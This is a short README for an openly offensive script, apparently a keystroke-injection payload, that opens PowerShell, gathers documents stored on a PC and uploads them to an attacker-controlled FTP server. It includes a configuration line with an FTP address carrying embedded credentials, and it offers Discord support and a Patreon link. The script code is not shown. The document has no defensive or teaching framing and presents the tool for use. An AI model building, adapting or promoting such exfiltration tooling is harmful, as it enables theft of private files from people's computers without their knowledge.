
# Exfiltrate Documents
This script will exfiltrate documents stored on the pc and upload them to a ftp server.

## How to use?

This script is not plug and play. You need to do the following changes:

- change the ftp server info right here "STRING $ftpAddr = "ftp://username:password@ftp.host.com/Report.zip"


## Features

- open powershell 
- exfiltrate documents
- upload documents to ftp server



## Feedback

If you have any feedback, please reach out to me via Discord "UNC0V3R3D#8662".






## Support

For support, contact me via  Discord "UNC0V3R3D#8662".


## Meta


- If you want to sponsor me on Patreon, the link is on my profile.


